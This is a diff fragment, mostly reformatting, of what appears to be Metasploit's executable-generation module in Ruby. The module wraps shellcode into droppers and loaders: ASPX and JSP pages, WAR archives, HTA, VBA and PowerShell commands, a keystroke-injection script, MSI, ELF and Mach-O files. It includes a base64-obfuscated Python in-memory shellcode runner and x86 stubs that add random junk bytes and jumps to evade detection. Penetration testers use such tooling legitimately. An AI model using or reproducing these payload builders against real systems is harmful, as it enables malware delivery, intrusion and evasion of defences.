+        hash_sub[:var_tempdir] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_basedir] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_filename] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_tempexe] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_iterator] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_proc] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:shellcode] = Rex::Text.to_csharp(exes, 100, hash_sub[:var_file])
+        read_replace_script_template('to_exe.aspx.template', hash_sub)
+      end
+
+      def self.to_mem_aspx(framework, code, exeopts = {})
+        # Initialize rig and value names
+        rig = Rex::RandomIdentifier::Generator.new
+        rig.init_var(:var_funcAddr)
+        rig.init_var(:var_hThread)
+        rig.init_var(:var_pInfo)
+        rig.init_var(:var_threadId)
+        rig.init_var(:var_bytearray)
+
+        hash_sub = rig.to_h
+        hash_sub[:shellcode] = Rex::Text.to_csharp(code, 100, rig[:var_bytearray])
+
+        read_replace_script_template('to_mem.aspx.template', hash_sub)
+      end
+
+      def self.to_win32pe_psh_net(framework, code, opts = {})
+        Rex::Powershell::Payload.to_win32pe_psh_net(Rex::Powershell::Templates::TEMPLATE_DIR, code)
+      end
+
+      def self.to_win32pe_psh(framework, code, opts = {})
+        Rex::Powershell::Payload.to_win32pe_psh(Rex::Powershell::Templates::TEMPLATE_DIR, code)
+      end
+
+      #
+      # Reflection technique prevents the temporary .cs file being created for the .NET compiler
+      # Tweaked by shellster
+      # Originally from PowerSploit
+      #
+      def self.to_win32pe_psh_reflection(framework, code, opts = {})
+        Rex::Powershell::Payload.to_win32pe_psh_reflection(Rex::Powershell::Templates::TEMPLATE_DIR, code)
+      end
+
+      def self.to_powershell_command(framework, arch, code)
+        template_path = Rex::Powershell::Templates::TEMPLATE_DIR
+        Rex::Powershell::Command.cmd_psh_payload(code,
+                                                 arch,
+                                                 template_path,
+                                                 encode_final_payload: true,
+                                                 method: 'reflection')
+      end
+
+      def self.to_powershell_ducky_script(framework, arch, code)
+        template_path = Rex::Powershell::Templates::TEMPLATE_DIR
+        powershell = Rex::Powershell::Command.cmd_psh_payload(code,
+                                                              arch,
+                                                              template_path,
+                                                              encode_final_payload: true,
+                                                              method: 'reflection')
+        replacers = {}
+        replacers[:var_payload] = powershell
+        read_replace_script_template('to_powershell.ducky_script.template', replacers)
+      end
+
+      def self.to_powershell_hta(framework, arch, code)
+        template_path = Rex::Powershell::Templates::TEMPLATE_DIR
+
+        powershell = Rex::Powershell::Command.cmd_psh_payload(code,
+                                                              arch,
+                                                              template_path,
+                                                              encode_final_payload: true,
+                                                              remove_comspec: true,
+                                                              method: 'reflection')
+
+        # Initialize rig and value names
+        rig = Rex::RandomIdentifier::Generator.new
+        rig.init_var(:var_shell)
+        rig.init_var(:var_fso)
+
+        hash_sub = rig.to_h
+        hash_sub[:powershell] = powershell
+
+        read_replace_script_template('to_powershell.hta.template', hash_sub)
+      end
+
+      def self.to_python_reflection(framework, arch, code, exeopts)
+        unless [ ARCH_X86, ARCH_X64, ARCH_AARCH64, ARCH_ARMLE, ARCH_MIPSBE, ARCH_MIPSLE, ARCH_PPC ].include? arch
+          raise "Msf::Util::EXE.to_python_reflection is not compatible with #{arch}"
+        end
+
+        python_code = <<~PYTHON
+          #{Rex::Text.to_python(code)}
+          import ctypes,os
+          if os.name == 'nt':
+           cbuf = (ctypes.c_char * len(buf)).from_buffer_copy(buf)
+           ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
+           ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_long(0),ctypes.c_long(len(buf)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
+           ctypes.windll.kernel32.RtlMoveMemory.argtypes = [ctypes.c_void_p,ctypes.c_void_p,ctypes.c_int]
+           ctypes.windll.kernel32.RtlMoveMemory(ptr,cbuf,ctypes.c_int(len(buf)))
+           ctypes.CFUNCTYPE(ctypes.c_int)(ptr)()
+          else:
+           import mmap
+           from ctypes.util import find_library
+           c = ctypes.CDLL(find_library('c'))
+           c.mmap.restype = ctypes.c_void_p
+           ptr = c.mmap(0,len(buf),mmap.PROT_READ|mmap.PROT_WRITE,mmap.MAP_ANONYMOUS|mmap.MAP_PRIVATE,-1,0)
+           ctypes.memmove(ptr,buf,len(buf))
+           c.mprotect.argtypes = [ctypes.c_void_p,ctypes.c_int,ctypes.c_int]
+           c.mprotect(ptr,len(buf),mmap.PROT_READ|mmap.PROT_EXEC)
+           ctypes.CFUNCTYPE(ctypes.c_int)(ptr)()
+        PYTHON
+
+        "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('#{Rex::Text.encode_base64(python_code)}')[0]))"
+      end
+
+      def self.to_win32pe_psh_msil(framework, code, opts = {})
+        Rex::Powershell::Payload.to_win32pe_psh_msil(Rex::Powershell::Templates::TEMPLATE_DIR, code)
+      end
+
+      def self.to_win32pe_psh_rc4(framework, code, opts = {})
+        # unlike other to_win32pe_psh_* methods, this expects powershell code, not asm
+        # this method should be called after other to_win32pe_psh_* methods to wrap the output
+        Rex::Powershell::Payload.to_win32pe_psh_rc4(Rex::Powershell::Templates::TEMPLATE_DIR, code)
+      end
+
+      def self.to_jsp(exe)
+        hash_sub = {}
+        hash_sub[:var_payload] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_exepath] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_outputstream] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_payloadlength] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_bytes] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_counter] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_exe] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_proc] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_fperm] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_fdel] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_exepatharray] = Rex::Text.rand_text_alpha(rand(8..15))
+
+        payload_hex = exe.unpack('H*')[0]
+        hash_sub[:payload] = payload_hex
+
+        read_replace_script_template('to_exe.jsp.template', hash_sub)
+      end
+
+      # Creates a Web Archive (WAR) file containing a jsp page and hexdump of a
+      # payload.  The jsp page converts the hexdump back to a normal binary file
+      # and places it in the temp directory. The payload file is then executed.
+      #
+      # @see to_war
+      # @param exe [String] Executable to drop and run.
+      # @param opts (see to_war)
+      # @option opts (see to_war)
+      # @return (see to_war)
+      def self.to_jsp_war(exe, opts = {})
+        template = to_jsp(exe)
+        to_war(template, opts)
+      end
+
+      def self.to_win32pe_vbs(framework, code, opts = {})
+        to_exe_vbs(to_win32pe(framework, code, opts), opts)
+      end
+
+      def self.to_win64pe_vbs(framework, code, opts = {})
+        to_exe_vbs(to_win64pe(framework, code, opts), opts)
+      end
+
+      # Creates a jar file that drops the provided +exe+ into a random file name
+      # in the system's temp dir and executes it.
+      #
+      # @see Msf::Payload::Java
+      #
+      # @return [Rex::Zip::Jar]
+      def self.to_jar(exe, opts = {})
+        spawn = opts[:spawn] || 2
+        exe_name = Rex::Text.rand_text_alpha(8) + '.exe'
+        zip = Rex::Zip::Jar.new
+        zip.add_sub('metasploit') if opts[:random]
+        paths = [
+          [ 'metasploit', 'Payload.class' ],
+        ]
+
+        zip.add_file('metasploit/', '')
+        paths.each do |path_parts|
+          path = ['java', path_parts].flatten.join('/')
+          contents = ::MetasploitPayloads.read(path)
+          zip.add_file(path_parts.join('/'), contents)
+        end
+
+        zip.build_manifest main_class: 'metasploit.Payload'
+        config = "Spawn=#{spawn}\r\nExecutable=#{exe_name}\r\n"
+        zip.add_file('metasploit.dat', config)
+        zip.add_file(exe_name, exe)
+
+        zip
+      end
+
+      # Creates a Web Archive (WAR) file from the provided jsp code.
+      #
+      # On Tomcat, WAR files will be deployed into a directory with the same name
+      # as the archive, e.g. +foo.war+ will be extracted into +foo/+. If the
+      # server is in a default configuration, deoployment will happen
+      # automatically. See
+      # {http://tomcat.apache.org/tomcat-5.5-doc/config/host.html the Tomcat
+      # documentation} for a description of how this works.
+      #
+      # @param jsp_raw [String] JSP code to be added in a file called +jsp_name+
+      #   in the archive. This will be compiled by the victim servlet container
+      #   (e.g., Tomcat) and act as the main function for the servlet.
+      # @param opts [Hash]
+      # @option opts :jsp_name [String] Name of the <jsp-file> in the archive
+      #   _without the .jsp extension_. Defaults to random.
+      # @option opts :app_name [String] Name of the app to put in the <servlet-name>
+      #   tag. Mostly irrelevant, except as an identifier in web.xml. Defaults to
+      #   random.
+      # @option opts :extra_files [Array<String,String>] Additional files to add
+      #   to the archive. First element is filename, second is data
+      #
+      # @todo Refactor to return a {Rex::Zip::Archive} or {Rex::Zip::Jar}
+      #
+      # @return [String]
+      def self.to_war(jsp_raw, opts = {})
+        jsp_name = opts[:jsp_name]
+        jsp_name ||= Rex::Text.rand_text_alpha_lower(rand(8..15))
+        app_name = opts[:app_name]
+        app_name ||= Rex::Text.rand_text_alpha_lower(rand(8..15))
+
+        meta_inf = [ 0xcafe, 0x0003 ].pack('Vv')
+        manifest = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_17 (Sun Microsystems Inc.)\r\n\r\n"
+        web_xml = %q{<?xml version="1.0"?>
 <!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd">
@@ -1773,119 +2142,116 @@ require 'digest/sha1'
 </servlet>
 </web-app>
 }
-    web_xml.gsub!('NAME', app_name)
-    web_xml.gsub!('PAYLOAD', jsp_name)
+        web_xml.gsub!('NAME', app_name)
+        web_xml.gsub!('PAYLOAD', jsp_name)
 
-    zip = Rex::Zip::Archive.new
-    zip.add_file('META-INF/', '', meta_inf)
-    zip.add_file('META-INF/MANIFEST.MF', manifest)
-    zip.add_file('WEB-INF/', '')
-    zip.add_file('WEB-INF/web.xml', web_xml)
-    # add the payload
-    zip.add_file("#{jsp_name}.jsp", jsp_raw)
+        zip = Rex::Zip::Archive.new
+        zip.add_file('META-INF/', '', meta_inf)
+        zip.add_file('META-INF/MANIFEST.MF', manifest)
+        zip.add_file('WEB-INF/', '')
+        zip.add_file('WEB-INF/web.xml', web_xml)
+        # add the payload
+        zip.add_file("#{jsp_name}.jsp", jsp_raw)
 
-    # add extra files
-    if opts[:extra_files]
-      opts[:extra_files].each {|el| zip.add_file(el[0], el[1])}
-    end
+        # add extra files
+        if opts[:extra_files]
+          opts[:extra_files].each { |el| zip.add_file(el[0], el[1]) }
+        end
 
-    zip.pack
-  end
-
-  # Creates a .NET DLL which loads data into memory
-  # at a specified location with read/execute permissions
-  #    - the data will be loaded at: base+0x2065
-  #    - default max size is 0x8000 (32768)
-  # @param  base [Integer] Default location set to base 0x12340000
-  # @param  data [String]
-  # @param  opts [Hash]
-  # @option      [String] :template
-  # @option      [String] :base_offset
-  # @option      [String] :timestamp_offset
-  # @option      [String] :text_offset
-  # @option      [String] :pack
-  # @option      [String] :uuid_offset
-  # @return      [String]
-  def self.to_dotnetmem(base=0x12340000, data="", opts = {})
-
-    # Allow the user to specify their own DLL template
-    set_template_default(opts, "dotnetmem.dll")
-
-    pe = self.get_file_contents(opts[:template])
-
-    # Configure the image base
-    base_offset = opts[:base_offset] || 180
-    pe[base_offset, 4] = [base].pack('V')
-
-    # Configure the TimeDateStamp
-    timestamp_offset = opts[:timestamp_offset] || 136
-    pe[timestamp_offset, 4] = [rand(0x100000000)].pack('V')
-
-    # XXX: Unfortunately we cant make this RWX only RX
-    # Mark this segment as read-execute AND writable
-    # pe[412,4] = [0xe0000020].pack("V")
-
-    # Write the data into the .text segment
-    text_offset = opts[:text_offset] || 0x1065
-    text_max    = opts[:text_max] || 0x8000
-    pack        = opts[:pack] || 'a32768'
-    pe[text_offset, text_max] = [data].pack(pack)
-
-    # Generic a randomized UUID
-    uuid_offset = opts[:uuid_offset] || 37656
-    pe[uuid_offset,16] = Rex::Text.rand_text(16)
-
-    pe
-  end
-
-  # self.encode_stub
-  #
-  # @param framework [Msf::Framework]
-  # @param arch     [String]
-  # @param code     [String]
-  # @param platform [String]
-  # @param badchars [String]
-  def self.encode_stub(framework, arch, code, platform = nil, badchars = '')
-    return code unless framework.encoders
-    framework.encoders.each_module_ranked('Arch' => arch) do |name, mod|
-      begin
-        enc = framework.encoders.create(name)
-        raw = enc.encode(code, badchars, nil, platform)
-        return raw if raw
-      rescue
+        zip.pack
       end
-    end
-    nil
-  end
 
-  def self.generate_nops(framework, arch, len, opts = {})
-    opts['BadChars'] ||= ''
-    opts['SaveRegisters'] ||= [ 'esp', 'ebp', 'esi', 'edi' ]
+      # Creates a .NET DLL which loads data into memory
+      # at a specified location with read/execute permissions
+      #    - the data will be loaded at: base+0x2065
+      #    - default max size is 0x8000 (32768)
+      # @param  base [Integer] Default location set to base 0x12340000
+      # @param  data [String]
+      # @param  opts [Hash]
+      # @option      [String] :template
+      # @option      [String] :base_offset
+      # @option      [String] :timestamp_offset
+      # @option      [String] :text_offset
+      # @option      [String] :pack
+      # @option      [String] :uuid_offset
+      # @return      [String]
+      def self.to_dotnetmem(base = 0x12340000, data = '', opts = {})
+        # Allow the user to specify their own DLL template
+        set_template_default(opts, 'dotnetmem.dll')
 
-    return nil unless framework.nops
-    framework.nops.each_module_ranked('Arch' => arch) do |name, mod|
-      begin
-        nop = framework.nops.create(name)
-        raw = nop.generate_sled(len, opts)
-        return raw if raw
-      rescue
-        # @TODO: stop rescuing everying on each of these, be selective
+        pe = get_file_contents(opts[:template])
+
+        # Configure the image base
+        base_offset = opts[:base_offset] || 180
+        pe[base_offset, 4] = [base].pack('V')
+
+        # Configure the TimeDateStamp
+        timestamp_offset = opts[:timestamp_offset] || 136
+        pe[timestamp_offset, 4] = [rand(0x100000000)].pack('V')
+
+        # XXX: Unfortunately we cant make this RWX only RX
+        # Mark this segment as read-execute AND writable
+        # pe[412,4] = [0xe0000020].pack("V")
+
+        # Write the data into the .text segment
+        text_offset = opts[:text_offset] || 0x1065
+        text_max = opts[:text_max] || 0x8000
+        pack = opts[:pack] || 'a32768'
+        pe[text_offset, text_max] = [data].pack(pack)
+
+        # Generic a randomized UUID
+        uuid_offset = opts[:uuid_offset] || 37656
+        pe[uuid_offset, 16] = Rex::Text.rand_text(16)
+
+        pe
       end
-    end
-    nil
-  end
 
-  # This wrapper is responsible for allocating RWX memory, copying the
-  # target code there, setting an exception handler that calls ExitProcess
-  # and finally executing the code.
-  def self.win32_rwx_exec(code)
-    stub_block = Rex::Payloads::Shuffle.from_graphml_file(
-      File.join(Msf::Config.install_root, 'data', 'shellcode', 'block_api.x86.graphml'),
-      arch: ARCH_X86,
-      name: 'api_call'
-    )
+      # self.encode_stub
+      #
+      # @param framework [Msf::Framework]
+      # @param arch     [String]
+      # @param code     [String]
+      # @param platform [String]
+      # @param badchars [String]
+      def self.encode_stub(framework, arch, code, platform = nil, badchars = '')
+        return code unless framework.encoders
 
-    stub_exit = %Q^
+        framework.encoders.each_module_ranked('Arch' => arch) do |name, _mod|
+          enc = framework.encoders.create(name)
+          raw = enc.encode(code, badchars, nil, platform)
+          return raw if raw
+        rescue StandardError
+        end
+        nil
+      end
+
+      def self.generate_nops(framework, arch, len, opts = {})
+        opts['BadChars'] ||= ''
+        opts['SaveRegisters'] ||= [ 'esp', 'ebp', 'esi', 'edi' ]
+
+        return nil unless framework.nops
+
+        framework.nops.each_module_ranked('Arch' => arch) do |name, _mod|
+          nop = framework.nops.create(name)
+          raw = nop.generate_sled(len, opts)
+          return raw if raw
+        rescue StandardError
+          # @TODO: stop rescuing everying on each of these, be selective
+        end
+        nil
+      end
+
+      # This wrapper is responsible for allocating RWX memory, copying the
+      # target code there, setting an exception handler that calls ExitProcess
+      # and finally executing the code.
+      def self.win32_rwx_exec(code)
+        stub_block = Rex::Payloads::Shuffle.from_graphml_file(
+          File.join(Msf::Config.install_root, 'data', 'shellcode', 'block_api.x86.graphml'),
+          arch: ARCH_X86,
+          name: 'api_call'
+        )
+
+        stub_exit = %^
     ; Input: EBP must be the address of 'api_call'.
     ; Output: None.
     ; Clobbers: EAX, EBX, (ESP will also be modified)
@@ -1907,7 +2273,7 @@ require 'digest/sha1'
       call ebp               ; call EXITFUNK( 0 );
     ^
 
-    stub_alloc = %Q^
+        stub_alloc = %^
       cld                    ; Clear the direction flag.
       call start             ; Call start, this pushes the address of 'api_call' onto the stack.
     delta:                   ;
@@ -1945,57 +2311,57 @@ require 'digest/sha1'
       jmp exitblock
     ^
 
-    stub_final = %Q^
+        stub_final = %(
     get_payload:
       call got_payload
     payload:
     ; Append an arbitrary payload here
-    ^
-
-    stub_alloc.gsub!('short', '')
-    stub_alloc.gsub!('byte', '')
-
-    wrapper = ""
-    # regs    = %W{eax ebx ecx edx esi edi ebp}
-
-    cnt_jmp = 0
-    stub_alloc.each_line do |line|
-      line.gsub!(/;.*/, '')
-      line.strip!
-      next if line.empty?
-
-      wrapper << "nop\n" if rand(2) == 0
-
-      if rand(2) == 0
-        wrapper << "jmp autojump#{cnt_jmp}\n"
-        1.upto(rand(8)+8) do
-          wrapper << "db 0x#{"%.2x" % rand(0x100)}\n"
-        end
-        wrapper << "autojump#{cnt_jmp}:\n"
-        cnt_jmp += 1
-      end
-      wrapper << line + "\n"
-    end
-
-    wrapper << stub_final
-
-    enc = Metasm::Shellcode.assemble(Metasm::Ia32.new, wrapper).encoded
-    enc.data + code
-  end
-
-  # This wrapper is responsible for allocating RWX memory, copying the
-  # target code there, setting an exception handler that calls ExitProcess,
-  # starting the code in a new thread, and finally jumping back to the next
-  # code to execute. block_offset is the offset of the next code from
-  # the start of this code
-  def self.win32_rwx_exec_thread(code, block_offset, which_offset='start')
-    stub_block = Rex::Payloads::Shuffle.from_graphml_file(
-      File.join(Msf::Config.install_root, 'data', 'shellcode', 'block_api.x86.graphml'),
-      arch: ARCH_X86,
-      name: 'api_call'
     )
 
-    stub_exit = %Q^
+        stub_alloc.gsub!('short', '')
+        stub_alloc.gsub!('byte', '')
+
+        wrapper = ''
+        # regs    = %W{eax ebx ecx edx esi edi ebp}
+
+        cnt_jmp = 0
+        stub_alloc.each_line do |line|
+          line.gsub!(/;.*/, '')
+          line.strip!
+          next if line.empty?
+
+          wrapper << "nop\n" if rand(2) == 0
+
+          if rand(2) == 0
+            wrapper << "jmp autojump#{cnt_jmp}\n"
+            1.upto(rand(8..15)) do
+              wrapper << "db 0x#{'%.2x' % rand(0x100)}\n"
+            end
+            wrapper << "autojump#{cnt_jmp}:\n"
+            cnt_jmp += 1
+          end
+          wrapper << line + "\n"
+        end
+
+        wrapper << stub_final
+
+        enc = Metasm::Shellcode.assemble(Metasm::Ia32.new, wrapper).encoded
+        enc.data + code
+      end
+
+      # This wrapper is responsible for allocating RWX memory, copying the
+      # target code there, setting an exception handler that calls ExitProcess,
+      # starting the code in a new thread, and finally jumping back to the next
+      # code to execute. block_offset is the offset of the next code from
+      # the start of this code
+      def self.win32_rwx_exec_thread(code, block_offset, which_offset = 'start')
+        stub_block = Rex::Payloads::Shuffle.from_graphml_file(
+          File.join(Msf::Config.install_root, 'data', 'shellcode', 'block_api.x86.graphml'),
+          arch: ARCH_X86,
+          name: 'api_call'
+        )
+
+        stub_exit = %^
     ; Input: EBP must be the address of 'api_call'.
     ; Output: None.
     ; Clobbers: EAX, EBX, (ESP will also be modified)
@@ -2016,7 +2382,7 @@ require 'digest/sha1'
       call ebp               ; call EXITFUNK( 0 );
     ^
 
-    stub_alloc = %Q^
+        stub_alloc = %^
       pushad                 ; Save registers
       cld                    ; Clear the direction flag.
       call start             ; Call start, this pushes the address of 'api_call' onto the stack.
@@ -2068,54 +2434,53 @@ require 'digest/sha1'
 ;     sub esp, 44            ; Move stack pointer back past the handler
     ^
 
-    stub_final = %Q^
+        stub_final = %(
     get_payload:
       call got_payload
     payload:
     ; Append an arbitrary payload here
-    ^
+    )
 
+        stub_alloc.gsub!('short', '')
+        stub_alloc.gsub!('byte', '')
 
-    stub_alloc.gsub!('short', '')
-    stub_alloc.gsub!('byte', '')
+        wrapper = ''
+        # regs    = %W{eax ebx ecx edx esi edi ebp}
 
-    wrapper = ""
-    # regs    = %W{eax ebx ecx edx esi edi ebp}
+        cnt_jmp = 0
+        cnt_nop = 64
 
-    cnt_jmp = 0
-    cnt_nop = 64
+        stub_alloc.each_line do |line|
+          line.gsub!(/;.*/, '')
+          line.strip!
+          next if line.empty?
 
-    stub_alloc.each_line do |line|
-      line.gsub!(/;.*/, '')
-      line.strip!
-      next if line.empty?
+          if cnt_nop > 0 && rand(4) == 0
+            wrapper << "nop\n"
+            cnt_nop -= 1
+          end
 
-      if cnt_nop > 0 && rand(4) == 0
-        wrapper << "nop\n"
-        cnt_nop -= 1
-      end
+          if cnt_nop > 0 && rand(16) == 0
+            cnt_nop -= 2
+            cnt_jmp += 1
 
-      if cnt_nop > 0 && rand(16) == 0
-        cnt_nop -= 2
-        cnt_jmp += 1
-
-        wrapper << "jmp autojump#{cnt_jmp}\n"
-        1.upto(rand(8)+1) do
-          wrapper << "db 0x#{"%.2x" % rand(0x100)}\n"
-          cnt_nop -= 1
+            wrapper << "jmp autojump#{cnt_jmp}\n"
+            1.upto(rand(1..8)) do
+              wrapper << "db 0x#{'%.2x' % rand(0x100)}\n"
+              cnt_nop -= 1
+            end
+            wrapper << "autojump#{cnt_jmp}:\n"
+          end
+          wrapper << line + "\n"
         end
-        wrapper << "autojump#{cnt_jmp}:\n"
-      end
-      wrapper << line + "\n"
-    end
 
-    # @TODO: someone who knows how to use metasm please explain the right way to do this.
-    wrapper << "db 0xe9\n db 0xFF\n db 0xFF\n db 0xFF\n db 0xFF\n"
-    wrapper << stub_final
+        # @TODO: someone who knows how to use metasm please explain the right way to do this.
+        wrapper << "db 0xe9\n db 0xFF\n db 0xFF\n db 0xFF\n db 0xFF\n"
+        wrapper << stub_final
 
-    enc = Metasm::Shellcode.assemble(Metasm::Ia32.new, wrapper).encoded
-    soff = enc.data.index("\xe9\xff\xff\xff\xff") + 1
-    res = enc.data + code
+        enc = Metasm::Shellcode.assemble(Metasm::Ia32.new, wrapper).encoded
+        soff = enc.data.index("\xe9\xff\xff\xff\xff") + 1
+        res = enc.data + code
 
     if which_offset == 'start'
       res[soff,4] = [block_offset - (soff + 4)].pack('V')
@@ -2252,22 +2617,263 @@ require 'digest/sha1'
         when ARCH_LOONGARCH64
           to_linux_loongarch64_elf(framework, code, exeopts)
         end
-      elsif plat && plat.index(Msf::Module::Platform::BSD)
-        case arch
-        when ARCH_X86,nil
-          Msf::Util::EXE.to_bsd_x86_elf(framework, code, exeopts)
-        when ARCH_X64
-          Msf::Util::EXE.to_bsd_x64_elf(framework, code, exeopts)
+        res
+      end
+
+      #
+      # Generate an executable of a given format suitable for running on the
+      # architecture/platform pair.
+      #
+      # This routine is shared between msfvenom, rpc, and payload modules (use
+      # <payload>)
+      #
+      # @param framework [Framework]
+      # @param arch [String] Architecture for the target format; one of the ARCH_*
+      # constants
+      # @param plat [#index] platform
+      # @param code [String] The shellcode for the resulting executable to run
+      # @param fmt [String] One of the executable formats as defined in
+      #   {.to_executable_fmt_formats}
+      # @param exeopts [Hash] Passed directly to the appropriate method for
+      #   generating an executable for the given +arch+/+plat+ pair.
+      # @return [String] An executable appropriate for the given
+      #   architecture/platform pair.
+      # @return [nil] If the format is unrecognized or the arch and plat don't
+      #   make sense together.
+      def self.to_executable_fmt(framework, arch, plat, code, fmt, exeopts)
+        # For backwards compatibility with the way this gets called when
+        # generating from Msf::Simple::Payload.generate_simple
+        if arch.is_a? Array
+          output = nil
+          arch.each do |a|
+            output = to_executable_fmt(framework, a, plat, code, fmt, exeopts)
+            break if output
+          end
+          return output
         end
-      elsif plat && plat.index(Msf::Module::Platform::Solaris)
-        case arch
-        when ARCH_X86,nil
-          to_solaris_x86_elf(framework, code, exeopts)
+
+        # otherwise the result of this huge case statement is returned
+        case fmt
+        when 'asp'
+          exe = to_executable_fmt(framework, arch, plat, code, 'exe-small', exeopts)
+          Msf::Util::EXE.to_exe_asp(exe, exeopts)
+        when 'aspx'
+          Msf::Util::EXE.to_mem_aspx(framework, code, exeopts)
+        when 'aspx-exe'
+          exe = to_executable_fmt(framework, arch, plat, code, 'exe-small', exeopts)
+          Msf::Util::EXE.to_exe_aspx(exe, exeopts)
+        when 'dll'
+          case arch
+          when ARCH_X86, nil
+            to_win32pe_dll(framework, code, exeopts)
+          when ARCH_X64
+            to_win64pe_dll(framework, code, exeopts)
+          end
+        when 'exe'
+          case arch
+          when ARCH_X86, nil
+            to_win32pe(framework, code, exeopts)
+          when ARCH_X64
+            to_win64pe(framework, code, exeopts)
+          end
+        when 'exe-service'
+          case arch
+          when ARCH_X86, nil
+            to_win32pe_service(framework, code, exeopts)
+          when ARCH_X64
+            to_win64pe_service(framework, code, exeopts)
+          end
+        when 'exe-small'
+          case arch
+          when ARCH_X86, nil
+            to_win32pe_old(framework, code, exeopts)
+          when ARCH_X64
+            to_win64pe(framework, code, exeopts)
+          end
+        when 'exe-only'
+          case arch
+          when ARCH_X86, nil
+            to_winpe_only(framework, code, exeopts)
+          when ARCH_X64
+            to_winpe_only(framework, code, exeopts, arch)
+          end
+        when 'msi'
+          case arch
+          when ARCH_X86, nil
+            exe = to_win32pe(framework, code, exeopts)
+          when ARCH_X64
+            exe = to_win64pe(framework, code, exeopts)
+          end
+          exeopts[:uac] = true
+          Msf::Util::EXE.to_exe_msi(framework, exe, exeopts)
+        when 'msi-nouac'
+          case arch
+          when ARCH_X86, nil
+            exe = to_win32pe(framework, code, exeopts)
+          when ARCH_X64
+            exe = to_win64pe(framework, code, exeopts)
+          end
+          Msf::Util::EXE.to_exe_msi(framework, exe, exeopts)
+        when 'elf'
+          if elf? code
+            return code
+          end
+
+          if !plat || plat.index(Msf::Module::Platform::Linux)
+            case arch
+            when ARCH_X86, nil
+              to_linux_x86_elf(framework, code, exeopts)
+            when ARCH_X64
+              to_linux_x64_elf(framework, code, exeopts)
+            when ARCH_AARCH64
+              to_linux_aarch64_elf(framework, code, exeopts)
+            when ARCH_ARMLE
+              to_linux_armle_elf(framework, code, exeopts)
+            when ARCH_MIPSBE
+              to_linux_mipsbe_elf(framework, code, exeopts)
+            when ARCH_MIPSLE
+              to_linux_mipsle_elf(framework, code, exeopts)
+            when ARCH_RISCV32LE
+              to_linux_riscv32le_elf(framework, code, exeopts)
+            when ARCH_RISCV64LE
+              to_linux_riscv64le_elf(framework, code, exeopts)
+            when ARCH_PPC64LE
+              to_linux_ppc64le_elf(framework, code, exeopts)
+            when ARCH_PPC
+              to_linux_ppc_elf(framework, code, exeopts)
+            when ARCH_PPCE500V2
+              to_linux_ppce500v2_elf(framework, code, exeopts)
+            end
+          elsif plat && plat.index(Msf::Module::Platform::BSD)
+            case arch
+            when ARCH_X86, nil
+              Msf::Util::EXE.to_bsd_x86_elf(framework, code, exeopts)
+            when ARCH_X64
+              Msf::Util::EXE.to_bsd_x64_elf(framework, code, exeopts)
+            end
+          elsif plat && plat.index(Msf::Module::Platform::Solaris)
+            case arch
+            when ARCH_X86, nil
+              to_solaris_x86_elf(framework, code, exeopts)
+            end
+          end
+        when 'elf-so'
+          if elf? code
+            return code
+          end
+
+          if !plat || plat.index(Msf::Module::Platform::Linux)
+            case arch
+            when ARCH_X86
+              to_linux_x86_elf_dll(framework, code, exeopts)
+            when ARCH_X64
+              to_linux_x64_elf_dll(framework, code, exeopts)
+            when ARCH_ARMLE
+              to_linux_armle_elf_dll(framework, code, exeopts)
+            when ARCH_AARCH64
+              to_linux_aarch64_elf_dll(framework, code, exeopts)
+            when ARCH_RISCV32LE
+              to_linux_riscv32le_elf_dll(framework, code, exeopts)
+            when ARCH_RISCV64LE
+              to_linux_riscv64le_elf_dll(framework, code, exeopts)
+            end
+          end
+        when 'macho', 'osx-app'
+          if macho? code
+            macho = code
+          else
+            macho = case arch
+                    when ARCH_X86, nil
+                      to_osx_x86_macho(framework, code, exeopts)
+                    when ARCH_X64
+                      to_osx_x64_macho(framework, code, exeopts)
+                    when ARCH_ARMLE
+                      to_osx_arm_macho(framework, code, exeopts)
+                    when ARCH_PPC
+                      to_osx_ppc_macho(framework, code, exeopts)
+                    when ARCH_AARCH64
+                      to_osx_aarch64_macho(framework, code, exeopts)
+                    end
+          end
+          fmt == 'osx-app' ? Msf::Util::EXE.to_osx_app(macho) : macho
+        when 'vba'
+          Msf::Util::EXE.to_vba(framework, code, exeopts)
+        when 'vba-exe'
+          exe = to_executable_fmt(framework, arch, plat, code, 'exe-small', exeopts)
+          Msf::Util::EXE.to_exe_vba(exe)
+        when 'vba-psh'
+          Msf::Util::EXE.to_powershell_vba(framework, arch, code)
+        when 'vbs'
+          exe = to_executable_fmt(framework, arch, plat, code, 'exe-small', exeopts)
+          Msf::Util::EXE.to_exe_vbs(exe, exeopts.merge({ persist: false }))
+        when 'loop-vbs'
+          exe = to_executable_fmt(framework, arch, plat, code, 'exe-small', exeopts)
+          Msf::Util::EXE.to_exe_vbs(exe, exeopts.merge({ persist: true }))
+        when 'jsp'
+          arch ||= [ ARCH_X86 ]
+          tmp_plat = plat.platforms if plat
+          tmp_plat ||= Msf::Module::PlatformList.transform('win')
+          exe = Msf::Util::EXE.to_executable(framework, arch, tmp_plat, code, exeopts)
+          Msf::Util::EXE.to_jsp(exe)
+        when 'war'
+          arch ||= [ ARCH_X86 ]
+          tmp_plat = plat.platforms if plat
+          tmp_plat ||= Msf::Module::PlatformList.transform('win')
